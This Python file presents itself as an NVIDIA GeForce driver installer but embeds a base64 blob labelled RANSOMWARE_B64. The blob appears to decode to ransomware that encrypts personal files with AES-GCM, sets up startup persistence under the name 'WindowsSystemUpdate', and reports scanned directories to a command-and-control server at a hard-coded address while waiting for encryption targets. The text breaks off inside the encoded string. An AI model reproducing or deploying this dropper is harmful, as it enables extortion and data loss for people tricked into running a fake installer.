import sys
import os
import base64
import subprocess
import threading
import time
import tempfile
import ctypes
from tkinter import Tk, Label, Button, ttk, PhotoImage, Frame

# --- CONFIGURATION ---
FAKE_TITLE = "NVIDIA GeForce Game Ready Driver Installer"
RANSOMWARE_B64 = "IyByYW5zb213YXJlLnB5CmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGpzb24KaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgc29ja2V0CmltcG9ydCBzaHV0aWwKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IGN0eXBlcwoKIyBERUJVRzogQ3Jhc2ggTG9nZ2luZyBmb3IgSW1wb3J0cwp0cnk6CiAgICBmcm9tIHRraW50ZXIgaW1wb3J0IFRrLCBMYWJlbCwgRW50cnksIEJ1dHRvbiwgU3RyaW5nVmFyLCBGcmFtZSwgUGhvdG9JbWFnZSwgbWVzc2FnZWJveAogICAgZnJvbSB0a2ludGVyIGltcG9ydCBmb250IGFzIHRrZm9udAogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycyBpbXBvcnQgQ2lwaGVyLCBhbGdvcml0aG1zLCBtb2RlcwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IGhhc2hlcwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMua2RmLnBia2RmMiBpbXBvcnQgUEJLREYySE1BQwogICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzIGltcG9ydCBkZWZhdWx0X2JhY2tlbmQKICAgIGltcG9ydCByZXF1ZXN0cwogICAgZnJvbSBweW5wdXQgaW1wb3J0IGtleWJvYXJkCmV4Y2VwdCBJbXBvcnRFcnJvciBhcyBlOgogICAgdHJ5OgogICAgICAgIGRlYnVnX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCJ+IiksICJSQU5TT01XQVJFX0lNUE9SVF9FUlJPUi50eHQiKQogICAgICAgIHdpdGggb3BlbihkZWJ1Z19wYXRoLCAidyIpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZiJGYWlsZWQgdG8gaW1wb3J0IG1vZHVsZXM6IHtlfSIpCiAgICBleGNlcHQ6IHBhc3MKICAgIHN5cy5leGl0KDEpCgojIC0tLSBDb25maWd1cmF0aW9uIC0tLQojIFBBU1RFIFRIRSBQVUJMSUMgS0VZIEZST00gVEhFIEMyIFNFUlZFUidTIENPTlNPTEUgT1VUUFVUIEhFUkUKQVRUQUNLRVJfUFVCTElDX0tFWSA9ICIiIi0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tCk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBeTI1YUVvQU11UVNaZi9OVWRDMVUKWk5ZVFhhTDBUODZSOTNWM01ORVlyK0liNUlidFdKZ2J4SWZ5MlJyckdsb2QwaCs1ZHh6NjlGZGZvVy9UQUZPMwpsblc2QXA4em5RREplOTdxbE01ZHJpY2wxNGtVYnFQd2M4c2s2QkFRb1Q5ZmFKU0ZhZ1JxU3NhR245WXZuenVXCm8wcTdvL0QraWxuR2M5WFdoSGdaRGwvdkVTR1pFWmVKRDFnZzM1MWlYcHBySjdBUmlmdUFWbyt4YWlnRXNtWU4KcEo1cWlKNXk5ZUVITEt3dUI2RmtwUi81Y3Q3VytHN1kxSGpFemtMbzhHK29RQjR6RmxyQUlOWlB2SG9RNHVKQQpFZnJVdkkvUHoyS2syUUN6RFhHWVpOY3NBYnlsMkVsbW1TcXBxejBzZjZkVks1Ty85bWw4bEZWbittK1E5SFQrCkR3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQoiIiIKCkMyX1NFUlZFUl9VUkwgPSAiaHR0cDovLzEwLjAuMC4yMTI6NTAwMCIgIyBDaGFuZ2UgaWYgeW91ciBDMiBpcyBob3N0ZWQgZWxzZXdoZXJlCgojIC0tLSBQQVRIIENPTkZJR1VSQVRJT04gLS0tCmRlZiBnZXRfcGF0aHMoKToKICAgICIiIkRldGVybWluZXMgc3RhYmxlIHBhdGhzIGZvciBjb25maWcgYW5kIHRhcmdldCBkYXRhLiIiIgogICAgaG9tZSA9IG9zLnBhdGguZXhwYW5kdXNlcigifiIpCiAgICAKICAgIGlmIG9zLm5hbWUgPT0gJ250JzoKICAgICAgICBjb25maWdfZGlyID0gb3MucGF0aC5qb2luKG9zLmVudmlyb24uZ2V0KCdBUFBEQVRBJywgaG9tZSksICJDZXJiZXJ1cyIpCiAgICBlbHNlOgogICAgICAgIGNvbmZpZ19kaXIgPSBvcy5wYXRoLmpvaW4oaG9tZSwgIi5jb25maWciLCAiY2VyYmVydXMiKQogICAgICAgIAogICAgIyBFTkNSWVBUIE9OTFkgJ3Rlc3RfZGF0YScgSU4gSE9NRSBESVJFQ1RPUlkKICAgIHRhcmdldF9kaXIgPSBvcy5wYXRoLmpvaW4oaG9tZSwgInRlc3RfZGF0YSIpCiAgICAKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhjb25maWdfZGlyKToKICAgICAgICB0cnk6IG9zLm1ha2VkaXJzKGNvbmZpZ19kaXIpCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgCiAgICByZXR1cm4gY29uZmlnX2RpciwgdGFyZ2V0X2RpcgoKQ09ORklHX0RJUiwgVEFSR0VUX0RJUkVDVE9SWSA9IGdldF9wYXRocygpCgojIFBlcnNpc3RlbmNlIEZpbGVzIChTdG9yZWQgaW4gSElEREVOIENvbmZpZyBEaXIpCkxPQ0tfRklMRSA9IG9zLnBhdGguam9pbihDT05GSUdfRElSLCAiLmNlcmJlcnVzX2xvY2siKQpJRF9GSUxFID0gb3MucGF0aC5qb2luKENPTkZJR19ESVIsICJjZXJiZXJ1c19pZC50eHQiKSAKS0VZX0JBQ0tVUF9GSUxFID0gb3MucGF0aC5qb2luKENPTkZJR19ESVIsICJjZXJiZXJ1c19rZXkuYmFrIikKTE9HX0ZJTEUgPSBvcy5wYXRoLmpvaW4oQ09ORklHX0RJUiwgImNlcmJlcnVzX2xvZy50eHQiKQpFTkNSWVBURURfUEFUSFNfRklMRSA9IG9zLnBhdGguam9pbihDT05GSUdfRElSLCAiZW5jcnlwdGVkX3BhdGhzLmpzb24iKSAgIyBUcmFjayB3aGljaCBkaXJzIHdlcmUgZW5jcnlwdGVkCgojIENsZWFudXAgTWFya2VyIChDYW4gc3RheSBpbiBjb25maWcgZGlyIG9yIGJlIGdsb2JhbCkKQ0xFQU5fTUFSS0VSID0gb3MucGF0aC5qb2luKENPTkZJR19ESVIsICIuY2VyYmVydXNfZnJlZWQiKQoKRU5DUllQVEVEX0VYVEVOU0lPTiA9ICIuY2VyYmVydXMiCgojIC0tLSBGaWxlIFR5cGUgVGFyZ2V0aW5nIC0tLQpUQVJHRVRfRVhURU5TSU9OUyA9IHsKICAgICcudHh0JywgJy5kb2MnLCAnLmRvY3gnLCAnLnhscycsICcueGxzeCcsICcucHB0JywgJy5wcHR4JywgJy5wZGYnLAogICAgJy5qcGcnLCAnLmpwZWcnLCAnLnBuZycsICcuZ2lmJywgJy5ibXAnLCAnLnRpZmYnLCAnLnN2ZycsCiAgICAnLm1wMycsICcud2F2JywgJy5tcDQnLCAnLmF2aScsICcubW92JywgJy5ta3YnLCAnLnNxbCcsICcuZGInCn0KCiMgLS0tIEdVSSBBc3NldCAoQmFzZTY0IGVuY29kZWQgMXgxIHJlZCBwaXhlbCBmb3IgbG9nbykgLS0tCkxPR09fQkFTRTY0ID0gIiIiCmlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFBRUFBQUFCQ0FZQUFBQWZGY1NKQUFBQURVbEVRVlI0Mm1QOC81K2hIZ0FIZ2dKL1BjaEk3d0FBQUFCSlJVNUVya0pnZ2c9PQoiIiIKCiMgLS0tIFBlcnNpc3RlbmNlIFV0aWxpdGllcyAtLS0KZGVmIGluc3RhbGxfcGVyc2lzdGVuY2UoKToKICAgICIiIkluc3RhbGxzIHRoZSByYW5zb213YXJlIHRvIHJ1biBvbiBzdGFydHVwIHVzaW5nIGFic29sdXRlIHBhdGhzLiIiIgogICAgdHJ5OgogICAgICAgIGlmIGdldGF0dHIoc3lzLCAnZnJvemVuJywgRmFsc2UpOgogICAgICAgICAgICBhcHBfcGF0aCA9IHN5cy5leGVjdXRhYmxlCiAgICAgICAgZWxzZToKICAgICAgICAgICAgYXBwX3BhdGggPSBvcy5wYXRoLmFic3BhdGgoX19maWxlX18pCiAgICAgICAgICAgIAogICAgICAgIGlmIG9zLm5hbWUgPT0gJ250JzoKICAgICAgICAgICAgaW1wb3J0IHdpbnJlZwogICAgICAgICAgICBrZXlfcGF0aCA9IHIiU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBrZXkgPSB3aW5yZWcuT3BlbktleSh3aW5yZWcuSEtFWV9DVVJSRU5UX1VTRVIsIGtleV9wYXRoLCAwLCB3aW5yZWcuS0VZX1NFVF9WQUxVRSkKICAgICAgICAgICAgICAgIGNtZCA9IGYnInthcHBfcGF0aH0iJwogICAgICAgICAgICAgICAgd2lucmVnLlNldFZhbHVlRXgoa2V5LCAiV2luZG93c1N5c3RlbVVwZGF0ZSIsIDAsIHdpbnJlZy5SRUdfU1osIGNtZCkKICAgICAgICAgICAgICAgIHdpbnJlZy5DbG9zZUtleShrZXkpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIGxvZ19lcnJvcihmIldpbmRvd3MgcGVyc2lzdGVuY2UgZmFpbGVkOiB7ZX0iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGF1dG9zdGFydF9kaXIgPSBvcy5wYXRoLmV4cGFuZHVzZXIoIn4vLmNvbmZpZy9hdXRvc3RhcnQiKQogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoYXV0b3N0YXJ0X2Rpcik6CiAgICAgICAgICAgICAgICB0cnk6IG9zLm1ha2VkaXJzKGF1dG9zdGFydF9kaXIpCiAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICAgICAgCiAgICAgICAgICAgIGRlc2t0b3BfZmlsZSA9IG9zLnBhdGguam9pbihhdXRvc3RhcnRfZGlyLCAic3lzdGVtX3VwZGF0ZS5kZXNrdG9wIikKICAgICAgICAgICAgd2l0aCBvcGVuKGRlc2t0b3BfZmlsZSwgInciKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShmIltEZXNrdG9wIEVudHJ5XVxuIikKICAgICAgICAgICAgICAgIGYud3JpdGUoZiJUeXBlPUFwcGxpY2F0aW9uXG4iKQogICAgICAgICAgICAgICAgZi53cml0ZShmIk5hbWU9U3lzdGVtIENyaXRpY2FsIFVwZGF0ZVxuIikKICAgICAgICAgICAgICAgICMgQ29tbWFuZDogcHl0aG9uMyAvcGF0aC90by9yYW5zb213YXJlLnB5CiAgICAgICAgICAgICAgICBpZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToKICAgICAgICAgICAgICAgICAgICAgY21kID0gZiJ7YXBwX3BhdGh9IgogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgY21kID0gZiJ7c3lzLmV4ZWN1dGFibGV9IHthcHBfcGF0aH0iCiAgICAgICAgICAgICAgICBmLndyaXRlKGYiRXhlYz17Y21kfVxuIikKICAgICAgICAgICAgICAgIGYud3JpdGUoZiJUZXJtaW5hbD1mYWxzZVxuIikKICAgICAgICAgICAgICAgIGYud3JpdGUoZiJYLUdOT01FLUF1dG9zdGFydC1lbmFibGVkPXRydWVcbiIpCiAgICAgICAgICAgIAogICAgICAgICAgICB0cnk6IHN1YnByb2Nlc3MucnVuKFsnY2htb2QnLCAnK3gnLCBkZXNrdG9wX2ZpbGVdKQogICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICAgICAgCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiUGVyc2lzdGVuY2UgaW5zdGFsbGF0aW9uIGZhaWxlZDoge2V9IikKCmRlZiByZW1vdmVfcGVyc2lzdGVuY2UoKToKICAgICIiIlJlbW92ZXMgdGhlIHBlcnNpc3RlbmNlIG1lY2hhbmlzbS4iIiIKICAgIHRyeToKICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgICAgIGltcG9ydCB3aW5yZWcKICAgICAgICAgICAga2V5X3BhdGggPSByIlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAga2V5ID0gd2lucmVnLk9wZW5LZXkod2lucmVnLkhLRVlfQ1VSUkVOVF9VU0VSLCBrZXlfcGF0aCwgMCwgd2lucmVnLktFWV9TRVRfVkFMVUUpCiAgICAgICAgICAgICAgICB3aW5yZWcuRGVsZXRlVmFsdWUoa2V5LCAiV2luZG93c1N5c3RlbVVwZGF0ZSIpCiAgICAgICAgICAgICAgICB3aW5yZWcuQ2xvc2VLZXkoa2V5KQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwYXNzIAogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHBhdGhzID0gWwogICAgICAgICAgICAgICAgb3MucGF0aC5leHBhbmR1c2VyKCJ+Ly5jb25maWcvYXV0b3N0YXJ0L3N5c3RlbV91cGRhdGUuZGVza3RvcCIpLAogICAgICAgICAgICAgICAgb3MucGF0aC5leHBhbmR1c2VyKCJ+Ly5sb2NhbC9zaGFyZS9hcHBsaWNhdGlvbnMvc3lzdGVtX3VwZGF0ZS5kZXNrdG9wIikKICAgICAgICAgICAgXQogICAgICAgICAgICBmb3IgcCBpbiBwYXRoczoKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHApOgogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShwKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ19lcnJvcihmIlBlcnNpc3RlbmNlIHJlbW92YWwgZmFpbGVkOiB7ZX0iKQoKIyAtLS0gU3lzdGVtIExvY2tkb3duIFV0aWxpdGllcyAtLS0KZGVmIGhpZGVfY29uc29sZSgpOgogICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgIHRyeToKICAgICAgICAgICAgaW1wb3J0IGN0eXBlcwogICAgICAgICAgICBrZXJuZWwzMiA9IGN0eXBlcy5XaW5ETEwoJ2tlcm5lbDMyJykKICAgICAgICAgICAgdXNlcjMyID0gY3R5cGVzLldpbkRMTCgndXNlcjMyJykKICAgICAgICAgICAgaFduZCA9IGtlcm5lbDMyLkdldENvbnNvbGVXaW5kb3coKQogICAgICAgICAgICBpZiBoV25kOgogICAgICAgICAgICAgICAgdXNlcjMyLlNob3dXaW5kb3coaFduZCwgMCkgIyBTV19ISURFID0gMAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcGFzcwoKIyAtLS0gQ3J5cHRvZ3JhcGh5IC0tLQpkZWYgZ2VuZXJhdGVfYWVzX2tleSgpOgogICAgcmV0dXJuIG9zLnVyYW5kb20oMzIpCgpkZWYgZW5jcnlwdF9maWxlX2Flc19nY20oZmlsZV9wYXRoLCBrZXkpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyYicpIGFzIGY6CiAgICAgICAgICAgIGRhdGEgPSBmLnJlYWQoKQogICAgICAgIG5vbmNlID0gb3MudXJhbmRvbSgxMikKICAgICAgICBjaXBoZXIgPSBDaXBoZXIoYWxnb3JpdGhtcy5BRVMoa2V5KSwgbW9kZXMuR0NNKG5vbmNlKSwgYmFja2VuZD1kZWZhdWx0X2JhY2tlbmQoKSkKICAgICAgICBlbmNyeXB0b3IgPSBjaXBoZXIuZW5jcnlwdG9yKCkKICAgICAgICBlbmNyeXB0ZWRfZGF0YSA9IGVuY3J5cHRvci51cGRhdGUoZGF0YSkgKyBlbmNyeXB0b3IuZmluYWxpemUoKQogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGggKyBFTkNSWVBURURfRVhURU5TSU9OLCAnd2InKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKG5vbmNlICsgZW5jcnlwdG9yLnRhZyArIGVuY3J5cHRlZF9kYXRhKQogICAgICAgIHJldHVybiBUcnVlCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiRmFpbGVkIHRvIGVuY3J5cHQge2ZpbGVfcGF0aH06IHtlfSIpCiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgZGVjcnlwdF9maWxlX2Flc19nY20oZW5jcnlwdGVkX3BhdGgsIGtleSk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGVuY3J5cHRlZF9wYXRoLCAncmInKSBhcyBmOgogICAgICAgICAgICBub25jZV90YWdfZGF0YSA9IGYucmVhZCgpCiAgICAgICAgbm9uY2UsIHRhZywgZW5jcnlwdGVkX2RhdGEgPSBub25jZV90YWdfZGF0YVs6MTJdLCBub25jZV90YWdfZGF0YVsxMjoyOF0sIG5vbmNlX3RhZ19kYXRhWzI4Ol0KICAgICAgICBjaXBoZXIgPSBDaXBoZXIoYWxnb3JpdGhtcy5BRVMoa2V5KSwgbW9kZXMuR0NNKG5vbmNlLCB0YWcpLCBiYWNrZW5kPWRlZmF1bHRfYmFja2VuZCgpKQogICAgICAgIGRlY3J5cHRvciA9IGNpcGhlci5kZWNyeXB0b3IoKQogICAgICAgIGRlY3J5cHRlZF9kYXRhID0gZGVjcnlwdG9yLnVwZGF0ZShlbmNyeXB0ZWRfZGF0YSkgKyBkZWNyeXB0b3IuZmluYWxpemUoKQogICAgICAgIG9yaWdpbmFsX3BhdGggPSBlbmNyeXB0ZWRfcGF0aC5yZW1vdmVzdWZmaXgoRU5DUllQVEVEX0VYVEVOU0lPTikKICAgICAgICB3aXRoIG9wZW4ob3JpZ2luYWxfcGF0aCwgJ3diJykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShkZWNyeXB0ZWRfZGF0YSkKICAgICAgICBvcy5yZW1vdmUoZW5jcnlwdGVkX3BhdGgpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dfZXJyb3IoZiJGYWlsZWQgdG8gZGVjcnlwdCB7ZW5jcnlwdGVkX3BhdGh9OiB7ZX0iKQogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNlY3VyZV9kZWxldGVfZmlsZShmaWxlX3BhdGgsIHBhc3Nlcz0xKTogCiAgICB0cnk6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZmlsZV9wYXRoKToKICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgImJhKyIpIGFzIGY6CiAgICAgICAgICAgICAgICBsZW5ndGggPSBmLnRlbGwoKQogICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAicitiIikgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUob3MudXJhbmRvbShsZW5ndGgpKQogICAgICAgICAgICBvcy5yZW1vdmUoZmlsZV9wYXRoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ19lcnJvcihmIkZhaWxlZCB0byBzZWN1cmVseSBkZWxldGUge2ZpbGVfcGF0aH06IHtlfSIpCgojIC0tLSBMb2dnaW5nIC0tLQpkZWYgbG9nX2Vycm9yKG1lc3NhZ2UpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihMT0dfRklMRSwgJ2EnKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKGYie3RpbWUuc3RyZnRpbWUoJyVZLSVtLSVkICVIOiVNOiVTJyl9IC0gRVJST1I6IHttZXNzYWdlfVxuIikKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzIAoKIyAtLS0gVGFyZ2V0IFNlbGVjdGlvbiAtLS0KZGVmIHNjYW5fZGlyZWN0b3JpZXMocm9vdF9wYXRoLCBtYXhfZGVwdGg9MiwgY3VycmVudF9kZXB0aD0wKToKICAgICIiIlJlY3Vyc2l2ZWx5IHNjYW4gZGlyZWN0b3JpZXMgdXAgdG8gbWF4X2RlcHRoIGxldmVscy4iIiIKICAgIGRpcnMgPSBbXQogICAgaWYgY3VycmVudF9kZXB0aCA+PSBtYXhfZGVwdGg6CiAgICAgICAgcmV0dXJuIGRpcnMKICAgIHRyeToKICAgICAgICBmb3IgZW50cnkgaW4gb3Muc2NhbmRpcihyb290X3BhdGgpOgogICAgICAgICAgICBpZiBlbnRyeS5pc19kaXIoKSBhbmQgbm90IGVudHJ5Lm5hbWUuc3RhcnRzd2l0aCgnLicpOgogICAgICAgICAgICAgICAgZGlycy5hcHBlbmQoZW50cnkucGF0aCkKICAgICAgICAgICAgICAgICMgUmVjdXJzaXZlbHkgc2NhbiBzdWJkaXJlY3RvcmllcwogICAgICAgICAgICAgICAgaWYgY3VycmVudF9kZXB0aCA8IG1heF9kZXB0aCAtIDE6CiAgICAgICAgICAgICAgICAgICAgZGlycy5leHRlbmQoc2Nhbl9kaXJlY3RvcmllcyhlbnRyeS5wYXRoLCBtYXhfZGVwdGgsIGN1cnJlbnRfZGVwdGggKyAxKSkKICAgIGV4Y2VwdCAoUGVybWlzc2lvbkVycm9yLCBPU0Vycm9yKToKICAgICAgICBwYXNzICAjIFNraXAgaW5hY2Nlc3NpYmxlIGRpcmVjdG9yaWVzCiAgICByZXR1cm4gZGlycwoKZGVmIF9nZXRfc3RhYmxlX3JlY29uX2lkKCk6CiAgICAiIiJHZW5lcmF0ZSBhIHN0YWJsZSBtYWNoaW5lLWJhc2VkIHJlY29uIElEIChzYW1lIGFjcm9zcyByZXN0YXJ0cykiIiIKICAgIFJFQ09OX0lEX0ZJTEUgPSBvcy5wYXRoLmpvaW4oQ09ORklHX0RJUiwgIi5jZXJiZXJ1c19yZWNvbl9pZCIpCiAgICAKICAgICMgSWYgd2UgYWxyZWFkeSBoYXZlIGEgcmVjb24gSUQgZnJvbSBhIHByZXZpb3VzIHJ1biwgcmV1c2UgaXQKICAgIGlmIG9zLnBhdGguZXhpc3RzKFJFQ09OX0lEX0ZJTEUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKFJFQ09OX0lEX0ZJTEUsICdyJykgYXMgZjoKICAgICAgICAgICAgICAgIHJlY29uX2lkID0gZi5yZWFkKCkuc3RyaXAoKQogICAgICAgICAgICBpZiByZWNvbl9pZDoKICAgICAgICAgICAgICAgIHJldHVybiByZWNvbl9pZAogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwogICAgCiAgICAjIEdlbmVyYXRlIGEgbmV3IHN0YWJsZSBJRCBiYXNlZCBvbiBtYWNoaW5lIGlkZW50aXR5CiAgICB0cnk6CiAgICAgICAgbWFjaGluZV9kYXRhID0gZiJ7b3MuZ2V0bG9naW4oKX1Ae3NvY2tldC5nZXRob3N0bmFtZSgpfSIKICAgIGV4Y2VwdDoKICAgICAgICBtYWNoaW5lX2RhdGEgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQogICAgaW1wb3J0IGhhc2hsaWIKICAgIHJlY29uX2lkID0gaGFzaGxpYi5tZDUobWFjaGluZV9kYXRhLmVuY29kZSgpKS5oZXhkaWdlc3QoKVs6MTJdCiAgICAKICAgICMgU2F2ZSBpdCBmb3IgZnV0dXJlIHJlc3RhcnRzCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKFJFQ09OX0lEX0ZJTEUsICd3JykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShyZWNvbl9pZCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAgICAKICAgIHJldHVybiByZWNvbl9pZAoKZGVmIHNjYW5fYW5kX3dhaXRfZm9yX2luc3RydWN0aW9ucygpOgogICAgIiIiCiAgICAxLiBTY2FucyBkaXJlY3RvcmllcyBpbiBob21lIChuZXN0ZWQgdXAgdG8gMiBsZXZlbHMpLgogICAgMi4gU2VuZHMgdGhlbSB0byBDMi4KICAgIDMuIFBvbGxzIHVudGlsIEMyIHNlbmRzIGJhY2sgYSB0YXJnZXQgbGlzdC4KICAgIFJldHVybnM6IGxpc3Qgb2YgcGF0aHMgdG8gZW5jcnlwdCwgb3IgTm9uZSBpZiBDMiB1bnJlYWNoYWJsZS4KICAgICIiIgogICAgaG9tZSA9IG9zLnBhdGguZXhwYW5kdXNlcigifiIpCiAgICAKICAgICMgU2NhbiBuZXN0ZWQgZm9sZGVycyAoMiBsZXZlbHMgZGVlcCkgaW4gaG9tZQogICAgZGlycyA9IHNjYW5fZGlyZWN0b3JpZXMoaG9tZSwgbWF4X2RlcHRoPTIpCiAgICBsb2dfZXJyb3IoZiJTY2FubmVkIHtsZW4oZGlycyl9IGRpcmVjdG9yaWVzICgyIGxldmVscyBkZWVwKSIpCiAgICAKICAgICMgVXNlIGEgU1RBQkxFIHJlY29uIElEIChzYW1lIGFjcm9zcyByZXN0YXJ0cykKICAgIHRlbXBfaWQgPSBfZ2V0X3N0YWJsZV9yZWNvbl9pZCgpCiAgICBsb2dfZXJyb3IoZiJSZWNvbiBJRDoge3RlbXBfaWR9IC0gRm91bmQge2xlbihkaXJzKX0gZm9sZGVycyIpCiAgICAKICAgICMgU2VuZCB0byBDMiAod2lsbCBPVkVSV1JJVEUgYW55IGV4aXN0aW5nIGVudHJ5IHdpdGggc2FtZSBJRCkKICAgIHBheWxvYWQgPSB7ImlkIjogdGVtcF9pZCwgInR5cGUiOiAiUkVDT04iLCAiZmlsZXMiOiBkaXJzfQogICAgdHJ5OgogICAgICAgIHJlcXVlc3RzLnBvc3QoZiJ7QzJfU0VSVkVSX1VSTH0vYXBpL3JlY29uIiwganNvbj1wYXlsb2FkLCB0aW1lb3V0PTUpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYiUmVjb24gc2VuZCBmYWlsZWQ6IHtlfSIpCiAgICAgICAgcmV0dXJuIE5vbmUgICMgRmFpbCB0byBvZmZsaW5lIG1vZGUKICAgIAogICAgIyBQb2xsIGZvciBjb21tYW5kIOKAlCB3YWl0IHVwIHRvIDIgSE9VUlMgKDE0NDAgw5cgNXMpCiAgICBsb2dfZXJyb3IoIldhaXRpbmcgZm9yIGF0dGFja2VyIHRvIHNlbGVjdCB0YXJnZXRzLi4uIikKICAgIGZvciBpIGluIHJhbmdlKDE0NDApOgogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcCA9IHJlcXVlc3RzLmdldChmIntDMl9TRVJWRVJfVVJMfS9hcGkvdGFzay97dGVtcF9pZH0iLCB0aW1lb3V0PTUpCiAgICAgICAgICAgIGlmIHJlc3Auc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgZGF0YSA9IHJlc3AuanNvbigpCiAgICAgICAgICAgICAgICBpZiBkYXRhLmdldCgiYWN0aW9uIikgPT0gIkVOQ1JZUFQiOgogICAgICAgICAgICAgICAgICAgIHRhcmdldHMgPSBkYXRhLmdldCgidGFyZ2V0cyIsIFtdKQogICAgICAgICAgICAgICAgICAgIGxvZ19lcnJvcihmIlJlY2VpdmVkIEVOQ1JZUFQgY29tbWFuZCBmb3Ige2xlbih0YXJnZXRzKX0gdGFyZ2V0cyIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRhcmdldHMKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICAKICAgICAgICAjIFJlLXBvc3QgcmVjb24gZXZlcnkgfjEgbWludXRlIHRvIGtlZXAgImxhc3Rfc2VlbiIgZnJlc2ggb24gQzIKICAgICAgICBpZiBpID4gMCBhbmQgaSAlIDEyID09IDA6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoZiJ7QzJfU0VSVkVSX1VSTH0vYXBpL3JlY29uIiwganNvbj1wYXlsb2FkLCB0aW1lb3V0PTUpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAKICAgICAgICB0aW1lLnNsZWVwKDUpCiAgICAKICAgIGxvZ19lcnJvcigiVGltZWQgb3V0IHdhaXRpbmcgZm9yIGNvbW1hbmQgKDIgaG91cnMpIikKICAgIHJldHVybiBOb25lCgojIC0tLSBSYW5zb213YXJlIExvZ2ljIC0tLQpkZWYgZW5jcnlwdF9kaXJlY3RvcnkodGFyZ2V0X2xpc3Q9Tm9uZSk6CiAgICAiIiJFbmNyeXB0cyBmaWxlcyBpbiB0YXJnZXQgZGlyZWN0b3JpZXMuIElmIHRhcmdldF9saXN0IGlzIE5vbmUsIGZhbGxzIGJhY2sgdG8gZGVmYXVsdCBUQVJHRVRfRElSRUNUT1JZLiIiIgogICAgCiAgICAjIEZhbGxiYWNrIHRvIGRlZmF1bHQgaWYgbm8gbGlzdCBwcm92aWRlZCAob2ZmbGluZSBtb2RlKQogICAgaWYgdGFyZ2V0X2xpc3QgaXMgTm9uZSBvciBsZW4odGFyZ2V